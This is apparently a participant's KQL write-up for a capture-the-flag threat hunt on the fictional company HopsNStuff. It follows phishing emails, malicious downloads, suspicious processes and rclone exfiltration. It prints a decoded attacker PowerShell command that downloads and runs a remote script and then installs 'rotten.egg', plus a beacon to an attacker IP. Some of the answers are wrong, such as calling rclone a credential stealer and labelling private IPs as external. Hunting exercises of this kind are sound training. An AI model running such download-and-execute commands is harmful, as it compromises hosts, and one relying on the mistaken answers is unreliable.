@@ -1,0 +1,1449 @@
+﻿////////////////////HopsNStuff: An Easter APT hunt/////////////////////////////
+
+Section 1: KQL 101 🐣
+////How many employees are in the company?
+
+Employees
+| count ////923
+
+Each employee at HopsNStuff is assigned an IP address. Which employee has the IP address: 192.168.2.191?
+
+Employees
+| where ip_addr =="192.168.2.191"
+//John Clark
+
+//11/11/2021, 8:46:09 PM	John Clark	Mozilla/5.0 (Windows NT 5.1; Trident/7.0; rv:11.0) like Gecko	192.168.2.191	john_clark@hopsnstuff.com	hopsnstuff.com	joclark1	Brewer	HVYC-DESKTOP
+
+How many emails did Simeon Kakpovi receive?
+
+Email
+| where recipient contains "Kakpovi"
+| count //32
+
+How many distinct senders were seen in the email logs from easterdelights.org?
+
+Email
+| where sender contains "easterdelights.org"
+| distinct sender //1670
+
+How many unique URLs did “Arthur Raymond” visit?
+
+let  ArturIP=
+Employees
+| where name contains "Arthur Raymond"
+| project ip_addr;
+OutboundNetworkEvents
+| where src_ip in (ArturIP)
+|distinct url //72
+
+///How many domains in the PassiveDNS records contain the word “automation”? (hint: use the contains operator instead of has. If you get stuck, do a take 10 on the table to see what fields are available.)
+
+PassiveDns
+| where domain contains "automation"
+| distinct domain //34
+
+//What IP addresses did the domain automationpackages.com resolve to (if there are more than one, enter any one of them)?
+
+PassiveDns
+| where domain contains "automationpackages.com"
+| distinct ip
+
+//How many unique URLs were browsed by employees named “Karen”?
+
+let  KarenIP=
+Employees
+| where name contains "Karen"
+| project ip_addr;
+OutboundNetworkEvents
+| where src_ip in (KarenIP)
+|distinct url //154
+
+
+////////////////////////////Section 2: 🥚Info💰////////////////////////
+///Let's take a look at our SecurityAlerts. A security alert flagged on a file that was quarantined on March 31, 2023. Which host was this identified on?
+
+SecurityAlerts
+| where timestamp >= datetime(2023-03-31)
+| where description contains "quarantined"
+///2023-03-31T10:14:08.000Z
+// host QBYQ-DESKTOP
+///File: Dev-Requirements.zip
+
+Which employee uses this device? (the one found in Question 2)
+
+let Namedevice=
+
+SecurityAlerts
+| where timestamp >= datetime(2023-03-31)
+| where description contains "quarantined"
+| parse description with "A suspicious file was quarantined on host" Hostnamefound ":" *
+| project Hostnamefound
+
+Employees
+| where hostname contains "QBYQ-DESKTOP"
+| project name ///Barbara Rochford
+
+///How many unique hosts had this file on their system? (the file seen in the alert from question 1)
+
+FileCreationEvents
+| where filename contains "Dev-Requirements.zip"
+| distinct hostname //9
+
+//When was the earliest time this file was seen? (the file seen in the alert from question 1) Make sure to paste the exact timestamp from ADX
+
+FileCreationEvents
+| where filename contains "Dev-Requirements.zip"
+| order by timestamp asc
+///2023-03-23T09:52:06.000Z
+
+Investigate the earliest device that had this file. (the file seen in the alert from question 1) What's the role of the employee who uses this host machine?
+
+///2023-03-23T09:52:06.000Z ; FTVO-LAPTOP ; megeisinsky
+
+Employees
+| where hostname contains "FTVO-LAPTOP"
+| project role //Logistics Coordinator
+//meghann_geisinsky@hopsnstuff.com
+
+How many external emails did this employee (the one from question 5) receive based on the data you have?
+
+Email
+| where recipient contains "meghann_geisinsky@hopsnstuff.com"
+| where subject contains "EXTERNAL"
+| count //21
+
+How many external emails were sent to the employees from the unique host machines identified in Question 3?
+
+let Hostlis= datatable(Hostnames: string)
+[
+"FTVO-LAPTOP",
+"D8QS-MACHINE",
+"HVYC-DESKTOP",
+"DSKT-MACHINE",
+"UZ2E-LAPTOP",
+"AAGB-LAPTOP",
+"TEY9-LAPTOP",
+"JCKA-LAPTOP",
+"QBYQ-DESKTOP"
+];
+let emaillist=
+Employees
+| where hostname in (Hostlis)
+| distinct email_addr;
+Email
+| where recipient in (emaillist)
+| where subject contains "EXTERNAL"
+| count //219
+
+
+///From the emails you've found in Question 7, what is the email address of the sender that sent the most recent email that was BLOCKED?
+
+let Hostlis= datatable(Hostnames: string)
+[
+"FTVO-LAPTOP",
+"D8QS-MACHINE",
+"HVYC-DESKTOP",
+"DSKT-MACHINE",
+"UZ2E-LAPTOP",
+"AAGB-LAPTOP",
+"TEY9-LAPTOP",
+"JCKA-LAPTOP",
+"QBYQ-DESKTOP"
+];
+let emaillist=
+Employees
+| where hostname in (Hostlis)
+| distinct email_addr;
+Email
+| where recipient in (emaillist)
+| where subject contains "EXTERNAL" and verdict contains "BLOCKED"
+//dorothy_christopher@yandex.com (recent mail)
+
+What country is the email provider from the sender (8) headquartered in?
+dorothy_christopher@yandex.com 
+provider yandex.com  
+///What is the flag value contained in note.txt?
+
+///Let's investigate the file name that was flagged in Question 1. Look for this file in the emails you filtered for on Question 7. One of the emails marked SUSPICIOUS looks like it came from a partner company. What was the sender's email address?
+
+Dev-Requirements.zip
+
+
+let Hostlis= datatable(Hostnames: string)
+[
+"FTVO-LAPTOP",
+"D8QS-MACHINE",
+"HVYC-DESKTOP",
+"DSKT-MACHINE",
+"UZ2E-LAPTOP",
+"AAGB-LAPTOP",
+"TEY9-LAPTOP",
+"JCKA-LAPTOP",
+"QBYQ-DESKTOP"
+];
+let emaillist=
+Employees
+| where hostname in (Hostlis)
+| distinct email_addr;
+Email
+| where recipient in (emaillist)
+| where link contains "Dev-Requirements.zip"  and  verdict contains "SUSPICIOUS"
+///1 console_automation@gmail.com
+///2 catherine_phillips@ingredientswarehouse.com this is from the partner
+
+When was the email from question 10 sent?
+
+catherine_phillips@ingredientswarehouse.com
+/// 2023-03-24T04:28:56.000Z
+
+What is the email in the reply_to field in the email from question 10?
+
+//// development_software@hotmail.com
+
+
+To what IP address does the domain in the link field resolve to? Pick the IP address closest (in time) to when the email was sent to the employee in Question 11.
+
+http://development-module.com/search/search/images/files/Dev-Requirements.zip
+
+///domain  is development-module.com
+
+PassiveDns
+| where domain contains "development-module.com"
+| where timestamp <= datetime(2023-03-24T04:28:56)
+
+3/5/2023, 9:32:29 PM	196.108.248.138	development-module.com
+3/15/2023, 6:31:25 AM	215.236.67.20	development-module.com
+3/17/2023, 7:45:51 AM	221.2.0.193	development-module.com
+
+/////221.2.0.193
+
+At what time did the employee click on the link? (from the email in 10) Make sure to copy the exact timestamp
+
+catherine_phillips@ingredientswarehouse.com
+
+Email
+| where link contains "Dev-Requirements.zip"  and  verdict contains "SUSPICIOUS" and sender contains "catherine_phillips@ingredientswarehouse.com"
+
+http://development-module.com/search/search/images/files/Dev-Requirements.zip
+
+
+OutboundNetworkEvents
+| where url contains "http://development-module.com/search/search/images/files/Dev-Requirements.zip"
+//2023-03-24T10:07:34.000Z ; 192.168.2.191
+
+How many unique domains hosting the same file were clicked by employees?
+
+OutboundNetworkEvents
+| where url contains "Dev-Requirements.zip"
+| parse url with @"https://" domain1 "/"*
+| parse url with @"http://" domain2 "/"*
+| extend resultdomainEmail = coalesce(domain1, domain2)
+| distinct resultdomainEmail
+
+automation-development.dev
+development-module.com
+automation-module.dev
+developmentpackages.dev
+automation-packages.dev
+
+//5
+
+//Let's look at the emails from Question 10. Some of the emails mention a programming language. What is it?
+
+let Hostlis= datatable(Hostnames: string)
+[
+"FTVO-LAPTOP",
+"D8QS-MACHINE",
+"HVYC-DESKTOP",
+"DSKT-MACHINE",
+"UZ2E-LAPTOP",
+"AAGB-LAPTOP",
+"TEY9-LAPTOP",
+"JCKA-LAPTOP",
+"QBYQ-DESKTOP"
+];
+let emaillist=
+Employees
+| where hostname in (Hostlis)
+| distinct email_addr;
+Email
+| where recipient in (emaillist)
+//| where link contains "Dev-Requirements.zip"  and  verdict contains "SUSPICIOUS"
+| where subject contains "soft" or subject contains "programming"
+//3/24/2023, 4:28:56 AM	catherine_phillips@ingredientswarehouse.com	development_software@hotmail.com	john_clark@hopsnstuff.com	[EXTERNAL] RE:RE: IMPORTANT: Your Python software needs updating.	SUSPICIOUS	http://development-module.com/search/search/images/files/Dev-Requirements.zip
+
+//[EXTERNAL] RE:RE: IMPORTANT: Your Python software needs updating.
+//Python
+
+//Let's look for any references to the answer from Question 16 in running processes.
+/// What's the full command line that references the programming language?
+
+ProcessEvents
+| where process_commandline contains "python"
+| distinct process_commandline
+////powershell.exe Get-Command python
+
+How many unique hosts had this command line from the previous question?
+
+ProcessEvents
+| where process_commandline contains "python"
+| distinct hostname //18
+
+//Two of the Parent Process Names do not appear to be legitimate Windows executables. How many records in total have these Parent Process Names?
+
+ProcessEvents
+| where process_commandline contains "python"
+| distinct parent_process_name
+
+//parent_process_name
+powershell.exe
+nettor.dll
+rabbitmq.exe
+
+//these are not windows legitime
+nettor.dll
+rabbitmq.exe
+
+ProcessEvents
+| where parent_process_name  contains "nettor.dll" or parent_process_name contains "rabbitmq.exe"
+//42
+
+How many distinct hosts had these processes run on their systems?
+
+ProcessEvents
+| where parent_process_name  contains "nettor.dll" or parent_process_name contains "rabbitmq.exe"
+|distinct hostname //21
+
+When was the earliest time these processes were seen?
+
+ProcessEvents
+| where parent_process_name  contains "nettor.dll" or parent_process_name contains "rabbitmq.exe"
+| order by timestamp asc 
+///2023-03-10T11:09:58.000Z
+
+
+//Look for where the file was first seen on a host. Where was this file located? Copy and paste the full path.
+
+ProcessEvents
+| where parent_process_name  contains "nettor.dll" or parent_process_name contains "rabbitmq.exe"
+| where timestamp <=datetime(2023-03-10T11:09:58.000Z)
+/// file rabbitmq.exe firseen on 2023-03-10T11:09:58.000Z ; hostname OYHZ-DESKTOP usernams jocotto
+
+FileCreationEvents
+| where path contains "rabbitmq.exe"
+| where hostname contains "OYHZ-DESKTOP"
+//C:\ProgramData\rabbitmq.exe
+
+What is the SHA256 hash of this file?
+
+30bb094cc616fb4715cef4398a24b76570031ae23f86c4da4f8fd7e5c03ddfc5
+
+Search this hash on virustotal.com. What is the md5 hash for this file?
+
+MD5
+76d965def5c93a8fda85cff949edf7c6
+
+Let's look for the file in other places. What was the path for the file observed on March 13, 2023?
+
+FileCreationEvents
+| where path contains "rabbitmq.exe"
+| where timestamp >=datetime(2023-03-13)
+
+3/13/2023, 10:38:03 AM	CZVJ-LAPTOP	laminer	70feae2beda91d939246feef4fe850b1f05c6df114155e395511aea4f69bba78	C:\Users\Public\rabbitmq.exe	rabbitmq.exe	7zip.exe
+///C:\Users\Public\rabbitmq.exe
+
+
+//Now let's look at that path across all of the devices. We've already seen some files here from our previous investigation. Which file haven't we seen before?
+
+FileCreationEvents
+| where path contains @"C:\Users\Public\"
+| distinct filename
+
+go.dll
+rabbitmq.exe
+nettor.dll
+
+////go.dll never seen
+
+
+////Now that we have 3 file names, let's go back to our process events and find all parent processes that use these files. How many total records are there?
+
+let UnusualFilename= datatable(Unusualprocesse: string)
+[
+"go.dll",
+"rabbitmq.exe",
+"nettor.dll"
+];
+ProcessEvents
+| where parent_process_name has_any (UnusualFilename)
+//56
+
+///These executables seem to run powershell.exe on the command line and has some garbled text after it. After figuring out how to ungarble it, investigate what it's doing. A file is referenced at the end. What is it?
+
+let UnusualFilename= datatable(Unusualprocesse: string)
+[
+"go.dll",
+"rabbitmq.exe",
+"nettor.dll"
+];
+ProcessEvents
+| where parent_process_name has_any (UnusualFilename)
+| where process_commandline contains "powershell.exe"
+
+///powershell.exe -Nop -ExecutionPolicy bypass -enc cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiaWV4ICgoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vY2hvY29sYXRleS5vcmcvaW5zdGFsbC5wczEnKSkiICYmIFNFVCAiUEFUSD0lUEFUSCU7JUFMTFVTRVJTUFJPRklMRSVcY2hvY29sYXRleVxiaW4iOyBjaG9jbyBpbnN0YWxsIC15IHB5dGhvbjM7IHB5dGhvbjMgLW0gZWFzeV9pbnN0YWxsIEM6XFVzZXJzXFB1YmxpY1xyb3R0ZW4uZWdn
+//using cyberchef
+//powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"; choco install -y python3; python3 -m easy_install C:\Users\Public\rotten.egg
+// file reference C:\Users\Public\rotten.egg
+
+//rotten.egg
+
+This threat actor left the answer to a question among those processes. What's the answer?
+
+let UnusualFilename= datatable(Unusualprocesse: string)
+[
+"go.dll",
+"rabbitmq.exe",
+"nettor.dll",
+"rotten.egg"
+];
+ProcessEvents
+| where parent_process_name has_any (UnusualFilename)
+| distinct process_commandline
+
+SearchProtocolHost.exe V2hvIHRlbGxzIHRoZSBiZXN0IGVnZ3MgcHVucz9UaGUgY29tZWR5LWhlbnMh203.49.253.229:443
+use cyberchef
+SearchProtocolHost.exe Who tells the best eggs puns?The comedy-hens! 203.49.253.229:443
+
+//The comedy-hens
+
+How many unique IP addresses did this attacker use to communicate with the infected hosts?
+
+let UnusualFilename= datatable(Unusualprocesse: string)
+[
+"go.dll",
+"rabbitmq.exe",
+"nettor.dll",
+"rotten.egg"
+];
+ProcessEvents
+| where parent_process_name has_any (UnusualFilename)
+| distinct process_commandline
+| parse process_commandline with "SearchProtocolHost.exe V2hvIHRlbGxzIHRoZSBiZXN0IGVnZ3MgcHVucz9UaGUgY29tZWR5LWhlbnMh" IPsActor ":"*
+| distinct IPsActor //15
+
+203.49.253.229
+209.119.163.38
+196.108.248.138
+206.32.96.173
+131.15.28.92
+206.103.24.100
+200.64.106.15
+81.26.240.75
+215.236.67.20
+74.4.234.149
+221.2.0.193
+204.72.144.212
+210.65.174.202
+210.192.86.27
+
+On what date did this actor send their earliest email? YYYY-MM-DD
+
+
+///this simple
+
+let IPsActor = datatable(IPlist:string)
+[
+    "203.49.253.229",
+    "209.119.163.38",
+    "196.108.248.138",
+    "206.32.96.173",
+    "131.15.28.92",
+    "206.103.24.100",
+    "200.64.106.15",
+    "81.26.240.75",
+    "215.236.67.20",
+    "74.4.234.149",
+    "221.2.0.193",
+    "204.72.144.212",
+    "210.65.174.202",
+    "210.192.86.27"
+];
+let domainactor=
+PassiveDns
+| where ip  has_any (IPsActor)
+| distinct domain;
+Email
+| where link  has_any (domainactor)
+| order by timestamp asc
+
+//2023-03-10
+//actor frontendpython@gmail.com, reply to console_automation@gmail.com
+//link http://python-packages.com/files/files/Installation-Instructions.zip
+
+On what date did this actor send their most recent email? YYYY-MM-DD
+
+// Emails: console_automation@gmail.com
+// catherine_phillips@ingredientswarehouse.com
+// automation_development@gmail.com
+// emogene_visser@wesellcandy.com
+// frontendpython@gmail.com 
+// development_software@hotmail.com
+
+let EmailsActor = datatable(Emaillist:string)
+[
+   "console_automation@gmail.com",
+   "catherine_phillips@ingredientswarehouse.com",
+   "automation_development@gmail.com",
+   "emogene_visser@wesellcandy.com",
+   "frontendpython@gmail.com", 
+   "development_software@hotmail.com"
+];
+Email
+| where sender in (EmailsActor)
+| order by timestamp asc
+/// recent Email datetime(2023-04-01)
+
+What was the earliest time of day that this actor sent an email? (answer is the hour, e.g. 5 or 5am)
+Check the time query question 32
+
+//Response; 3am
+
+What was the latest time of day that this actor sent an email?
+(The answer is just one digit or E.G. 3PM)
+Check the time query question 32
+///9am
+
+///Section 3: Golden 🐇
+
+//A law enforcement agency informed HopsNStuff that an adversary was attempting to gain access to their company. They said the actor may have sent a PDF file called Ginger_beer_secret_recipe.pdf in February of 2023. What hostname had this file first?
+FileCreationEvents
+| where filename contains "Ginger_beer_secret_recipe.pdf"
+| where timestamp >= datetime(2023-02-01)
+| order by timestamp asc///KBBH-MACHINE ; kewalden
+
+///When was this file created on the host machine?
+//2023-02-08T17:32:47.000Z
+
+How many host machines total have a file with this observed filename (Ginger_beer_secret_recipe.pdf) ?
+
+FileCreationEvents
+| where filename contains "Ginger_beer_secret_recipe.pdf"
+| where timestamp >= datetime(2023-02-01)
+| distinct hostname ///9
+
+KBBH-MACHINE
+0YXZ-MACHINE
+XYTW-LAPTOP
+ZMLF-MACHINE
+JH92-DESKTOP
+3R58-LAPTOP
+NAFV-LAPTOP
+FDQZ-MACHINE
+QKPS-DESKTOP
+
+What is the role of the employees of those host machines?
+
+let  roleinfected=
+FileCreationEvents
+| where filename contains "Ginger_beer_secret_recipe.pdf"
+| where timestamp >= datetime(2023-02-01)
+| distinct hostname;
+Employees
+| where hostname in (roleinfected)
+| distinct role ///Secret Formular Guardian
+
+////Based on where the files are located on the hosts, how many files in total are found within that same path? (Hint: count the total number of files across all the observed filepaths)
+
+FileCreationEvents
+| where filename contains "Ginger_beer_secret_recipe.pdf"
+| where timestamp >= datetime(2023-02-01)
+| distinct path
+
+C:\Users\kewalden\Downloads\Ginger_beer_secret_recipe.pdf
+C:\Users\roboyce\Downloads\Ginger_beer_secret_recipe.pdf
+C:\Users\crflyer\Downloads\Ginger_beer_secret_recipe.pdf
+C:\Users\brkrebs\Downloads\Ginger_beer_secret_recipe.pdf
+C:\Users\jomcafee\Downloads\Ginger_beer_secret_recipe.pdf
+C:\Users\alstamos\Downloads\Ginger_beer_secret_recipe.pdf
+C:\Users\kadimes\Downloads\Ginger_beer_secret_recipe.pdf
+C:\Users\midarr\Downloads\Ginger_beer_secret_recipe.pdf
+C:\Users\eukaspersky\Downloads\Ginger_beer_secret_recipe.pdf
+
+
+FileCreationEvents
+where
+
+let pathlist= datatable(path: string)
+[
+@"C:\Users\kewalden\Downloads\",
+@"C:\Users\roboyce\Downloads\",
+@"C:\Users\crflyer\Downloads\",
+@"C:\Users\brkrebs\Downloads\",
+@"C:\Users\jomcafee\Downloads\",
+@"C:\Users\alstamos\Downloads\",
+@"C:\Users\kadimes\Downloads\",
+@"C:\Users\midarr\Downloads\",
+@"C:\Users\eukaspersky\Downloads\"
+];
+FileCreationEvents
+| where path has_any (pathlist)
+| where timestamp >= datetime(2023-02-01)
+| project filename //239
+
+How many of those files are PDFs?
+
+let pathlist= datatable(path: string)
+[
+@"C:\Users\kewalden\Downloads\",
+@"C:\Users\roboyce\Downloads\",
+@"C:\Users\crflyer\Downloads\",
+@"C:\Users\brkrebs\Downloads\",
+@"C:\Users\jomcafee\Downloads\",
+@"C:\Users\alstamos\Downloads\",
+@"C:\Users\kadimes\Downloads\",
+@"C:\Users\midarr\Downloads\",
+@"C:\Users\eukaspersky\Downloads\"
+];
+FileCreationEvents
+| where path has_any (pathlist)
+| where filename contains ".pdf"
+| where timestamp >= datetime(2023-02-01)
+| project filename //49
+
+How many distinct PDF filenames are there from the previous question?
+
+let pathlist= datatable(path: string)
+[
+@"C:\Users\kewalden\Downloads\",
+@"C:\Users\roboyce\Downloads\",
+@"C:\Users\crflyer\Downloads\",
+@"C:\Users\brkrebs\Downloads\",
+@"C:\Users\jomcafee\Downloads\",
+@"C:\Users\alstamos\Downloads\",
+@"C:\Users\kadimes\Downloads\",
+@"C:\Users\midarr\Downloads\",
+@"C:\Users\eukaspersky\Downloads\"
+];
+FileCreationEvents
+| where path has_any (pathlist)
+| where filename contains ".pdf"
+| where timestamp >= datetime(2023-02-01)
+| distinct  filename //4
+
+Ginger_beer_secret_recipe.pdf
+mention.pdf
+appear.pdf
+Brewery_layout.pdf
+
+Did any of the other files hit on security alerts? Answer "None" if there weren't any, or submit any of the other filenames that did
+
+let pathlist= datatable(path: string)
+[
+@"C:\Users\kewalden\Downloads\",
+@"C:\Users\roboyce\Downloads\",
+@"C:\Users\crflyer\Downloads\",
+@"C:\Users\brkrebs\Downloads\",
+@"C:\Users\jomcafee\Downloads\",
+@"C:\Users\alstamos\Downloads\",
+@"C:\Users\kadimes\Downloads\",
+@"C:\Users\midarr\Downloads\",
+@"C:\Users\eukaspersky\Downloads\"
+];
+let otherfilename=
+FileCreationEvents
+| where path has_any (pathlist)
+| where filename contains ".pdf"
+| where timestamp >= datetime(2023-02-01)
+| distinct  filename;
+SecurityAlerts
+| where description has_any (otherfilename) 
+//Brewery_layout.pdf
+
+///Were there any additional host machines identified from the answer from the previous question? Answer "None" if there weren't any, or submit any of the other hostnames you identified.
+
+Host from question 3
+
+KBBH-MACHINE
+0YXZ-MACHINE
+XYTW-LAPTOP
+ZMLF-MACHINE
+JH92-DESKTOP
+3R58-LAPTOP
+NAFV-LAPTOP
+FDQZ-MACHINE
+QKPS-DESKTOP
+
+host from the previous question 8
+
+FileCreationEvents
+| where filename contains "Brewery_layout.pdf"
+| distinct hostname
+
+NSM0-MACHINE
+QKPS-DESKTOP
+NAFV-LAPTOP
+3R58-LAPTOP
+ZMLF-MACHINE
+FDQZ-MACHINE
+JH92-DESKTOP
+KBBH-MACHINE
+0YXZ-MACHINE
+XYTW-LAPTOP
+
+
+
+Result from Question 3 and 8
+
+//yes additional host is NSM0-MACHINE
+
+
+///Let's investigate where the two suspicious pdf files came from. How many emails had a reference to the file(s)?
+
+2 files;
+
+Ginger_beer_secret_recipe.pdf
+Brewery_layout.pdf
+
+Email
+| where link contains "Ginger_beer_secret_recipe.pdf" or link contains "Brewery_layout.pdf"
+//0
+
+How many Outbbound connections referenced the file(s)?  
+
+OutboundNetworkEvents
+| where url  contains "Ginger_beer_secret_recipe.pdf" or url  contains "Brewery_layout.pdf"
+
+How many distinct domains were observed in links containing these filenames?
+
+OutboundNetworkEvents
+| where url  contains "Ginger_beer_secret_recipe.pdf" or url  contains "Brewery_layout.pdf"
+| parse url with @"https://" domain1 "/"*
+| parse url with @"http://" domain2 "/"*
+| extend resultdomainEmail = coalesce(domain1, domain2)
+| distinct resultdomainEmail //19
+
+How many unique file(s) are referenced from the identified domains?
+
+OutboundNetworkEvents
+| take 1
+
+let domainlist= datatable(domain: string)
+[
+"betterthansilver.us",
+"getrichorbouncetrying.com",
+"abunslife.us",
+"getyabreadup.com",
+"moneybags.net",
+"betterthansilver.biz",
+"abunslife.org",
+"getrichorbouncetrying.org",
+"moneybags.us",
+"abunslife.com",
+"abunslife.biz",
+"moneybags.org",
+"getrichorbouncetrying.biz",
+"betterthansilver.net",
+"moneybags.biz",
+"abunslife.net",
+"getrichorbouncetrying.net",
+"betterthansilver.org",
+"getyabreadup.org"
+];
+OutboundNetworkEvents
+| where url has_any (domainlist)
+//| extend FileName = extract(@"/([^/?]+)$", 1, url)
+| extend FileName = extract(@"/([^/?]+\.[A-Za-z0-9]+)$", 1, url)
+| where isnotempty(FileName)
+| distinct FileName //7
+
+suspecious files;
+
+Marketing_strategy.pptx
+Ginger_beer_secret_recipe.pdf
+Ginger_beer_testing_results.docx
+Recipe.docx
+Brewer_salaries.docx
+Brewery_layout.pdf
+Financials.xlsx
+
+Based on your investigation, HopsNStuff may have been a victim of what type of initial attack?
+search with chatgpt
+///Watering Hole
+
+Let's investigate this activity further. What's the parent_process_hash of the tool that was used to steal user credentials?
+
+
+
+let suspecioushost= datatable(hostname: string)
+[
+"NSM0-MACHINE",
+"QKPS-DESKTOP",
+"NAFV-LAPTOP",
+"3R58-LAPTOP",
+"ZMLF-MACHINE",
+"FDQZ-MACHINE",
+"JH92-DESKTOP",
+"KBBH-MACHINE",
+"0YXZ-MACHINE",
+"XYTW-LAPTOP"
+];
+ProcessEvents
+| where hostname in (suspecioushost)
+| distinct parent_process_name, parent_process_hash
+
+list of parent_process_name
+
+services.exe
+explorer.exe
+cmd.exe
+powershell.exe
+sc.exe
+a.exe
+msdtc.exe
+svchost.exe
+rclone.exe
+
+search on the AI rclone.exe is a tool to steal creadential
+parent process hash is:
+
+614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f
+
+
+///Investigate the running processes. There are suspicious processes conducting reconnaissance. How many unique directory paths are these suspicious processes located in on infected host machines? (Find the recon command, and go identify its process parent file on disk)
+
+let suspecioushost= datatable(hostname: string)
+[
+"NSM0-MACHINE",
+"QKPS-DESKTOP",
+"NAFV-LAPTOP",
+"3R58-LAPTOP",
+"ZMLF-MACHINE",
+"FDQZ-MACHINE",
+"JH92-DESKTOP",
+"KBBH-MACHINE",
+"0YXZ-MACHINE",
+"XYTW-LAPTOP"
+];
+let process_parent_file=
+ProcessEvents
+| where hostname in (suspecioushost)
+| where process_commandline contains "whoami"
+| distinct parent_process_name;////process parent file found msdtc.exe svchost.exe a.exe
+FileCreationEvents
+| where path has_any (process_parent_file)
+| distinct path
+| extend DirectoryPath = extract(@"^(.*)\\[^\\]+$", 1, path)
+| distinct DirectoryPath
+
+////  total paths found
+
+C:\ProgramData\PST\msdtc.exe
+C:\a.exe
+C:\svchost.exe
+C:\ProgramData\PST\a.exe
+C:\Windows\System32\svchost.exe
+C:\ProgramData\PST\svchost.exe
+C:\Windows\System32\en-US\msdtc.exe.mui
+C:\msdtc.exe
+C:\Windows\System32\en-US\svchost.exe.mui
+C:\Windows\System32\msdtc.exe
+
+///After extracting and comparing path 
+
+C:\ProgramData\PST 
+C:
+C:\Windows\System32
+C:\Windows\System32\en-US
+
+/// unique directory are 2
+C:\ProgramData\PST 
+C:\Windows\System32
+
+How many distinct filenames are located in these directory paths?
+
+
+let suspecioushost= datatable(hostname: string)
+[
+"NSM0-MACHINE",
+"QKPS-DESKTOP",
+"NAFV-LAPTOP",
+"3R58-LAPTOP",
+"ZMLF-MACHINE",
+"FDQZ-MACHINE",
+"JH92-DESKTOP",
+"KBBH-MACHINE",
+"0YXZ-MACHINE",
+"XYTW-LAPTOP"
+];
+let process_parent_file=
+ProcessEvents
+| where hostname in (suspecioushost)
+| where process_commandline contains "whoami"
+| distinct parent_process_name;////process parent file found msdtc.exe svchost.exe a.exe
+FileCreationEvents
+| where path has_any (process_parent_file)
+| where path contains @"C:\ProgramData\" or path contains @"C:\Windows\System32"
+| distinct filename
+
+///Result
+msdtc.exe
+a.exe
+svchost.exe
+msdtc.exe.mui
+svchost.exe.mui
+
+//we have 3 distinc file names msdtc.exe , a.exe, svchost.exe
+
+//// S3Q18; Let's look at the authentication logs for users related to the suspected infected hosts. How many distinct external IP addresses were observed logging into the users of those hosts?
+
+let suspecioushost= datatable(hostname: string)
+[
+"NSM0-MACHINE",
+"QKPS-DESKTOP",
+"NAFV-LAPTOP",
+"3R58-LAPTOP",
+"ZMLF-MACHINE",
+"FDQZ-MACHINE",
+"JH92-DESKTOP",
+"KBBH-MACHINE",
+"0YXZ-MACHINE",
+"XYTW-LAPTOP"
+];
+Employees
+| where hostname  has_any (suspecioushost)
+| distinct ip_addr
+//10 distinct external IP addresses
+
+192.168.0.102
+192.168.0.166
+192.168.0.106
+192.168.0.162
+192.168.0.81
+192.168.0.25
+192.168.0.58
+192.168.0.37
+192.168.0.46
+192.168.0.153
+
+
+///Which IP address appears to be located in South America? Hint: Check AbuseIPDB or MaxMind GeoIP2 Database
+
+let SuspectedHosts = datatable(hostname:string)
+[
+"NSM0-MACHINE",
+"QKPS-DESKTOP",
+"NAFV-LAPTOP",
+"3R58-LAPTOP",
+"ZMLF-MACHINE",
+"FDQZ-MACHINE",
+"JH92-DESKTOP",
+"KBBH-MACHINE",
+"0YXZ-MACHINE",
+"XYTW-LAPTOP"
+];
+let SuspectedUsers =
+Employees
+| where hostname in (SuspectedHosts)
+| distinct username;
+AuthenticationEvents
+| where username in (SuspectedUsers)
+| distinct src_ip
+
+199.232.196.19
+192.168.0.81
+192.168.0.102
+192.168.0.25
+182.191.37.246
+43.212.22.115
+192.168.0.162
+184.184.206.12
+192.168.0.58
+189.82.187.235
+131.178.14.170
+192.168.0.46
+192.168.0.153
+192.168.0.106
+161.112.205.73
+204.190.33.85
+7.74.189.248
+192.168.0.166
+192.168.0.37
+211.233.68.113
+
+//using AI , I checked all the IPs 20 found in the authentification logging
+
+//one is from Brazil : 189.82.187.235
+
+How many IP addresses appear to be located in Asia?
+
+I checked with AI : 2
+211.233.68.113 south Korean
+189.82.187.235 Brazil
+
+
+
+////  IAM here
+
+
+let SuspectedHosts = datatable(hostname:string)
+[
+"NSM0-MACHINE",
+"QKPS-DESKTOP",
+"NAFV-LAPTOP",
+"3R58-LAPTOP",
+"ZMLF-MACHINE",
+"FDQZ-MACHINE",
+"JH92-DESKTOP",
+"KBBH-MACHINE",
+"0YXZ-MACHINE",
+"XYTW-LAPTOP"
+];
+let SuspectedUsers =
+Employees
+| where hostname in (SuspectedHosts)
+| distinct username;
+ProcessEvents
+| where username in (SuspectedUsers)
+| where process_commandline has_any ("rclone", "curl", "wget", "bitsadmin", "certutil")
+| project timestamp, hostname, process_name, process_commandline
+//rclone.exe
+
+How many unique domains were used for exfiltration? Answer 0 if you did not find any.
+
+let SuspectedHosts = datatable(hostname:string)
+[
+"NSM0-MACHINE",
+"QKPS-DESKTOP",
+"NAFV-LAPTOP",
+"3R58-LAPTOP",
+"ZMLF-MACHINE",
+"FDQZ-MACHINE",
+"JH92-DESKTOP",
+"KBBH-MACHINE",
+"0YXZ-MACHINE",
+"XYTW-LAPTOP"
+];
+let SuspectedUsers =
+Employees
+| where hostname in (SuspectedHosts)
+| distinct username;
+ProcessEvents
+| where username in (SuspectedUsers)
+| where process_commandline has_any ("rclone", "curl", "wget", "bitsadmin", "certutil")
+| project timestamp, hostname, process_name, process_commandline
+|distinct process_commandline //22
+
+////Let's look at the most recent exfiltration activity and the domain used in Questions 21-22. What IP address does this domain resolve to? (Hint: choose the IP address closest to when the date of activity occured)
+
+let SuspectedHosts = datatable(hostname:string)
+[
+"NSM0-MACHINE",
+"QKPS-DESKTOP",
+"NAFV-LAPTOP",
+"3R58-LAPTOP",
+"ZMLF-MACHINE",
+"FDQZ-MACHINE",
+"JH92-DESKTOP",
+"KBBH-MACHINE",
+"0YXZ-MACHINE",
+"XYTW-LAPTOP"
+];
+let SuspectedUsers =
+Employees
+| where hostname in (SuspectedHosts)
+| distinct username;
+ProcessEvents
+| where username in (SuspectedUsers)
+| where process_commandline has_any ("rclone")
+| project timestamp, hostname, process_name, process_commandline
+| order by timestamp desc 
+
